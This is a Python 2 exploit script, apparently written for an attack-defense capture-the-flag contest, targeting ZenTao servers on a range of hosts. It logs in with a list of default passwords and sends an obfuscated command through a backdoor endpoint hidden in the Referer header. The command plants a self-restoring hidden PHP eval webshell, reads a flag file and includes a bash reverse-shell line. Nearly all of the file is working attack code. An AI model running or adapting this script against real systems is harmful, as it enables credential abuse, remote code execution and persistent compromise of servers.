#!/usr/bin/env python
# encoding:utf-8

from random import randint,choice
from hashlib import md5

import sys
import urllib
import string
import zlib
import base64
import requests
import re

def choicePart(seq,amount):
    length = len(seq)
    if length == 0 or length < amount:
        print 'Error Input'
        return None
    result = []
    indexes = []
    count = 0
    while count < amount:
        i = randint(0,length-1)
        if not i in indexes:
            indexes.append(i)
            result.append(seq[i])
            count += 1
            if count == amount:
                return result

def randBytesFlow(amount):
    result = ''
    for i in xrange(amount):
        result += chr(randint(0,255))
    return  result

def randAlpha(amount):
    result = ''
    for i in xrange(amount):
        result += choice(string.ascii_letters)
    return result

def loopXor(text,key):
    result = ''
    lenKey = len(key)
    lenTxt = len(text)
    iTxt = 0
    while iTxt < lenTxt:
        iKey = 0
        while iTxt<lenTxt and iKey<lenKey:
            result += chr(ord(key[iKey]) ^ ord(text[iTxt]))
            iTxt += 1
            iKey += 1
    return result


def debugPrint(msg):
    if debugging:
        print msg

def login(host, port, username, password, sess):
    url = "http://%s:%d/www/index.php?m=user&f=login"%(host,port)
    data = {
        "account":username,
        "password":password,
        "referer":""
    }
    print "Login: %s" % (data)
    response = sess.post(url, data)
    print response.content
    return not "failed." in response.content

# config
debugging = True
keyh = "ccd2" # $kh
keyf = "e8f9" # $kf


users = [
    ('admin', '123456'),
    ('admin', 'duolaAmeng'),
    ('productManager', '123456'),
    ('projectManager', '123456'),
    ('dev1', '123456'),
    ('dev2', '123456'),
    ('dev3', '123456'),
    ('tester1', '123456'),
    ('tester2', '123456'),
    ('tester3', '123456'),
    ('testManager', '123456'),
    ('admin', 'Bctf666'),
    ('productManager', 'Bctf666'),
    ('projectManager', 'Bctf666'),
    ('dev1', 'Bctf666'),
    ('dev2', 'Bctf666'),
    ('dev3', 'Bctf666'),
    ('tester1', 'Bctf666'),
    ('tester2', 'Bctf666'),
    ('tester3', 'Bctf666'),
    ('testManager', 'Bctf666'),
    ('admin', 'whoami1.'),
    ('productManager', 'whoami1.'),
    ('projectManager', 'whoami1.'),
    ('dev1', 'whoami1.'),
    ('dev2', 'whoami1.'),
    ('dev3', 'whoami1.'),
    ('tester1', 'whoami1.'),
    ('tester2', 'whoami1.'),
    ('tester3', 'whoami1.'),
    ('testManager', 'whoami1.'),
]

import string
import random

def random_string(length):
    return "".join([random.choice(string.letters) for i in range(length)])

def get_flag(host, port):
    for username, password in users:
        xorKey = keyh + keyf

        path = "www/index.php?m=misc&f=door"
        base_url = "http://%s:%d/" % (host, port)
        #username = "admin"
        #password = "duolaAmensg"

        url = "%s%s"%(base_url, path)
        defaultLang = 'zh-CN'
        languages = ['zh-TW;q=0.%d','zh-HK;q=0.%d','en-US;q=0.%d','en;q=0.%d']
        proxies = None # {'http':'http://127.0.0.1:8080'} # proxy for debug

        sess = requests.Session()

# generate random Accept-Language only once each session
        langTmp = choicePart(languages,3)
        indexes = sorted(choicePart(range(1,10),3), reverse=True)

        acceptLang = [defaultLang]
        for i in xrange(3):
            acceptLang.append(langTmp[i] % (indexes[i],))
        acceptLangStr = ','.join(acceptLang)
        debugPrint(acceptLangStr)

        init2Char = acceptLang[0][0] + acceptLang[1][0] # $i
        md5head = (md5(init2Char + keyh).hexdigest())[0:3]
        md5tail = (md5(init2Char + keyf).hexdigest())[0:3] + randAlpha(randint(3,8))
        debugPrint('$i is %s' % (init2Char))
        debugPrint('md5 head: %s' % (md5head,))
        debugPrint('md5 tail: %s' % (md5tail,))

# password = "9b792b5a388aefcbfafaad97534ca3ce"
        if not login(host, port, username, password, sess):
            print "[-] Login failed! Next user!"
            continue
        print "---------------"
        print sess.cookies['zentaosid']
        print "---------------"
        session_id = sess.cookies['zentaosid']
# Interactive php shell
        cmd = "system('id');"
        cmd = '''
        system('bash -c "bash -i >&/dev/tcp/127.0.0.1/4444 0>&1 2>&1"');
        '''
        filename = random_string(0x10)
        password = random_string(0x10)
        with open("webshell.log", "a+") as f:
            f.write("http://%s:%d/www/data/.%s.php POST %s\n" % (host, port, filename, password))

        print "--------------------->>>>>>>>>>>>>>>>>>>>>>>>>"

        content = '''
        <?php
    ignore_user_abort(true);
    set_time_limit(0);
    $file = '.''' + filename + '''.php';
    $code = '<?php eval($_POST['''+password+''']);?>';
    while(true) {
        if(!file_exists($file)) {
            file_put_contents($file, $code);
        }
        usleep(50);
    }
?>'''
        print content

        shell_path = "/var/www/html/www/data/.index.php"
        shell_url = "http://%s:%d/www/data/.index.php" % (host, port)
        cmd = '@file_put_contents("%s", base64_decode("%s"));@readfile("/flag");system("curl --max-time 3 %s");' % (shell_path, content.encode("base64"), shell_url)
        query = []
        for i in xrange(max(indexes)+1+randint(0,2)):
            key = randAlpha(randint(3,6))
            value = base64.urlsafe_b64encode(randBytesFlow(randint(3,12)))
            query.append((key, value))
        debugPrint('Before insert payload:')
        debugPrint(query)
        debugPrint(urllib.urlencode(query))

        # encode payload
        payload = zlib.compress(cmd)
        payload = loopXor(payload,xorKey)
        payload = base64.urlsafe_b64encode(payload)
        payload = md5head + payload

        # cut payload, replace into referer
        cutIndex = randint(2,len(payload)-3)
        payloadPieces = (payload[0:cutIndex], payload[cutIndex:], md5tail)
        iPiece = 0
        for i in indexes:
            query[i] = (query[i][0],payloadPieces[iPiece])
            iPiece += 1
        referer = base_url + '?' + urllib.urlencode(query)
        debugPrint('After insert payload, referer is:')
        debugPrint(query)
        debugPrint(referer)

        headers = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'DNT': '1',
            'Accept-Encoding': 'gzip, deflate, br',
            'Accept-Langding': 'gzip, deflate, br',
            'Cookie':'zentaosid='+session_id+'; lang=en; device=desktop; theme=default; windowHeight=177; windowWidth=902',
            'Accept-Language':acceptLangStr,
            'Referer':referer,
        }

        '''
        cookies = {
            "zentaosid":"udr3fgb3cep05guuse7j25vgrj",
            "lang":"en",
            "device":"desktop",
            "theme":"default",
            "windowWidth":"917",
            "windowHeight":"547",
        }
        '''
        # send request
        r = sess.get(url,headers=headers,proxies=proxies)
        html = r.text
        debugPrint(html)

        # process response
        pattern = re.compile(r'<%s>(.*)</%s>' % (xorKey,xorKey))
        output = pattern.findall(html)
        if len(output) == 0:
            print 'Error,  no backdoor response'
            return ""
        output = output[0]
        debugPrint(output)
        output = output.decode('base64')
        output = loopXor(output,xorKey)
        output = zlib.decompress(output)
        print output
        return output


if __name__ == "__main__":
    for i in range(10,26):
        host = "172.16.5.%d" % (i)
        port = 5073
        get_flag(host, port)

